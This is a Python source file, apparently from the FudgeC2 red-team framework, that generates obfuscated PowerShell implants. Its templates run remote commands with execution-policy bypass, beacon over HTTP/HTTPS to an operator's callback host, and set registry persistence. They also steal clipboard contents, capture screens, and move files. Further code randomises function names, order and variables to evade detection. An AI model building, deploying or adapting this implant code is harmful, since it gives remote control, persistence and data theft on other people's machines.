import jinja2
import string
import random

from Implant.PSObfucate import PSObfucate
from Implant.ImplantFunctionality import ImplantFunctionality


class ImplantGenerator:
    # ImplantGenerator has a single public method (generate_implant_from_template)
    #   which is used to generate a new active implant in the event of a stager
    #   calling back. Configuration from the implant template is used to determine
    #   which functionality should be embedded within the active implant.

    ImpFunc = ImplantFunctionality()

    JinjaRandomisedArgs = {
        "obf_remote_play_audio": "RemotePlayAudio",
        "obf_sleep": "sleep",
        "obf_select_protocol": "select_protocol",
        "obf_collect_sysinfo": "collect-sysinfo",
        "obf_http_conn": "http-connection",
        "obf_https_conn": "https-connection",
        "obf_dns_conn": "dns-connection",
        "obf_create_persistence": "create-persistence",
        "obf_builtin_command": "execute-command",
        "obf_reg_key_name": "FudgeC2Persistence",
        "obf_callback_url": "url",
        "obf_callback_reason": "callback_reason",
        "obf_get_clipboard": "export-clipboard",
        "obf_load_module": "load-ext-module",
        "obf_invoke_module": "invoke-module",
        "obf_get_loaded_modules": "get-loaded-modules",
        "obf_upload_file": "upload-file",
        "obf_download_file": "download-file",
        "obf_screen_capture": "screen-capture"
        }

    old_execute_command = '''
function {{ ron.obf_builtin_command }}($data){
    $a = $data.Substring(0,2)
    $script:command_id = $data.Substring(2,24)
    if ($data.Substring(26).length -gt 1){
        $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.Substring(26)))
    } else {
        $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.Substring(26)))
    }
    if($a -eq "CM"){
        $c = [System.Convert]::ToBase64String([system.Text.Encoding]::Unicode.getbytes($b))
        $Script:tr = powershell.exe -exec bypass -EncodedCommand $c
    } elseif($a -eq "SI"){
        {{ ron.obf_collect_sysinfo }}
    } elseif ($a -eq "EP"){
        {{ ron.obf_create_persistence }}
    } elseif ($a -eq "PS"){
        {{ ron.obf_remote_play_audio }}($b)
    } elseif ($a -eq "EC"){ 
        {{ ron.obf_get_clipboard }} 
    } elseif ($a -eq "LM"){
        {{ ron.obf_load_module }}($b)
    } elseif ($a -eq "IM"){
        {{ ron.obf_invoke_module }}($b)
    } elseif ($a -eq "ML"){
        {{ ron.obf_get_loaded_modules }}  
    } elseif ($a -eq "FD"){
        {{ ron.obf_download_file }}($b)
    } elseif ($a -eq "UF"){
        {{ ron.obf_upload_file }}($b)
    } elseif ($a -eq "SC"){
        {{ ron.obf_screen_capture }}($b)
    } else {
        $Script:tr = "0"
    }
}
'''

    execute_command = '''
function {{ ron.obf_builtin_command }}($data){
    $a = $data.Substring(0,2)
    $script:command_id = $data.Substring(2,24)
    if ($data.Substring(26).length -gt 1){
        $b = [System.Convert]::FromBase64String($data.Substring(26))
    }
    
    if($a -eq "CM"){
        $c = [System.Convert]::ToBase64String([system.Text.Encoding]::Unicode.getbytes([System.Text.Encoding]::UTF8.GetString($b)))
        $Script:tr = powershell.exe -exec bypass -EncodedCommand $c
    } elseif($a -eq "SI"){
        {{ ron.obf_collect_sysinfo }}
    } elseif ($a -eq "EP"){
        {{ ron.obf_create_persistence }}
    } elseif ($a -eq "PS"){
        {{ ron.obf_remote_play_audio }}($b)
    } elseif ($a -eq "EC"){ 
        {{ ron.obf_get_clipboard }} 
    } elseif ($a -eq "LM"){
        {{ ron.obf_load_module }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "IM"){
        {{ ron.obf_invoke_module }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "ML"){
        {{ ron.obf_get_loaded_modules }}  
    } elseif ($a -eq "FD"){
        {{ ron.obf_download_file }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "UF"){
        {{ ron.obf_upload_file }}([System.Text.Encoding]::UTF8.GetString($b))
    } elseif ($a -eq "SC"){
        {{ ron.obf_screen_capture }}([System.Text.Encoding]::UTF8.GetString($b))
    } else {
        $Script:tr = "0"
    }
}
'''


    http_function = '''
function {{ ron.obf_http_conn }}(${{ ron.obf_callback_reason }}){
    if ( ${{ ron.obf_callback_reason }} -eq 0 ){
        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/index"
        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
        $Script:headers = $r.Content

    } else {
        $URL = "http://"+${{ ron.obf_callback_url }}+":{{ http_port }}/help"
        $enc = [system.Text.Encoding]::UTF8
        $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
        $data2 = $script:command_id+$data2
        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
        $Script:headers = $r.Content
    }
}
'''

    https_function = '''
function {{ ron.obf_https_conn }}(${{ ron.obf_callback_reason }}){
    if ( ${{ ron.obf_callback_reason }} -eq 0 ){
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/index"
        $r = iwr -uri $URL -headers @{"X-Implant" = "{{ uii }}"} -method 'GET' -UseBasicParsing
        $Script:headers = $r.Content
    } else {
        $URL = "https://"+${{ ron.obf_callback_url }}+":{{ https_port }}/help"
        $enc = [system.Text.Encoding]::UTF8
        $data2 = [System.Convert]::ToBase64String($enc.GetBytes(${{ ron.obf_callback_reason }}))
        $data2 = $script:command_id+$data2
        $r = iwr -uri $URL -method 'POST' -headers @{"X-Result"= "{{ uii }}"} -body $data2 -UseBasicParsing
        $Script:headers = $r.Content
    }
}
'''

    select_protocol = '''
function {{ ron.obf_select_protocol }}($b){
    sleep (Get-Random -Minimum (${{ ron.obf_sleep }} *0.90) -Maximum (${{ ron.obf_sleep }} *1.10))
    return get-random($b)
}
'''

    implant_main = '''
$script:command_id = 0  
{{ obf_variables }}
{% if obfuscation_level == 0 %}
# Implant generated by:
# https://github.com/Ziconius/FudgeC2
{% endif %}
start-sleep({{ initial_sleep }})
${{ ron.obf_sleep }}={{ beacon }}
${{ ron.obf_callback_url }} = "{{ url }}"
while($true){
    $plh=0
    $headers = $null
    try {
            {{ proto_core }}
    } catch {
        $_.Exception | format-list -Force | Out-Null
    }
    if (($headers -NotLike "==") -And ($headers -ne $null)){
        {{ ron.obf_builtin_command }}($headers)
        
        if ($tr -ne "0"){ 
            $atr = $tr -join "`n"
            $plh = $atr
            try {
                    {{ proto_core }}
            } catch {
                $_.Exception | format-list -Force | Out-Null
            }
        }       
    }
}
'''

    def _manage_implant_function_order(self, implant_info, function_list):
        # -- This is responsible for randomising the function order within the generated implant.
        if implant_info['obfuscation_level'] >= 1:
            random.shuffle(function_list)
        constructed_base_implant = ""
        for implant_function in function_list:
            constructed_base_implant = constructed_base_implant + implant_function.rstrip()
        constructed_base_implant = constructed_base_implant + self.implant_main
        return constructed_base_implant.lstrip()

    def _function_name_obfuscation(self, implant_info, function_names):
        if implant_info['obfuscation_level'] >= 2:
            for key in function_names.keys():
                letters = string.ascii_lowercase
                temp_string = ''.join(random.choice(letters) for i in range(8))
                if temp_string not in function_names.values():
                    function_names[key] = temp_string
        return function_names

    def _process_modules(self, implant_data, randomised_function_names):
        # Add default functions to added to the implant which will be randomised.
        core_implant_functions = [
            self.execute_command,
            self.select_protocol
            ]

        implant_functions = self.ImpFunc.get_list_of_implant_text()
        implant_functions.extend(core_implant_functions)

        # Checks which protocols should be embedded into the implant.
        if implant_data['comms_http'] is not None:
            implant_functions.append(self.http_function)
        if implant_data['comms_https'] is not None:
            implant_functions.append(self.https_function)
        # TODO: These protocols will be delivered in later version of FudgeC2
        # if id['comms_dns'] != None:
        #     implant_functions.append(self.https_function)
        # if id['comms_binary'] != None:
        #     implant_functions.append(self.https_function)

        constructed_implant = self._manage_implant_function_order(implant_data, implant_functions)

        # Generates the blob of code which will be used to determine which protocol should be selected from.
        protocol_string = ""
        proto_count = 0
        proto_list = {'comms_http': randomised_function_names['obf_http_conn'],
                      'comms_https': randomised_function_names['obf_https_conn'],
                      'comms_dns': randomised_function_names['obf_dns_conn']}

        for x in proto_list.keys():
            if implant_data[x] is not 0:
                protocol_string = protocol_string + "    " + str(proto_count) + " { " + proto_list[x] + "($plh) }\n"
                proto_count += 1

        f_str = 'switch ('+randomised_function_names['obf_select_protocol']+'('+str(proto_count)+') ){ \n'+protocol_string+' }'
        return constructed_implant, f_str

    def generate_implant_from_template(self, implant_data):
        """
        generate_implant_from_template
         - Takes the generated implant info (Generated implants (by UIK)

        _process_modules
         - This controls which protocols and additional modules are embedded into the implant.
         - Generates the main function multi proto selection
        """
        implant_function_names = self._function_name_obfuscation(implant_data, self.JinjaRandomisedArgs)
        implant_template, protocol_switch = self._process_modules(implant_data, implant_function_names)

        callback_url = implant_data['callback_url']
        variable_list = ""
        if implant_data['obfuscation_level'] >= 3:
            ps_ofb = PSObfucate()
            variable_list, callback_url = ps_ofb.variableObs(implant_data['callback_url'])

        cc = jinja2.Template(implant_template)
        output_from_parsed_template = cc.render(
            initial_sleep=implant_data['initial_delay'],
            http=12345,
            url=callback_url,
            http_port=implant_data['comms_http'],
            https_port=implant_data['comms_https'],
            dns_port=implant_data['comms_dns'],
            uii=implant_data['unique_implant_id'],
            stager_key=implant_data['stager_key'],
            ron=implant_function_names,
            beacon=implant_data['beacon'],
            proto_core=protocol_switch,
            obfuscation_level=implant_data['obfuscation_level'],
            obf_variables=variable_list
        )

        return output_from_parsed_template
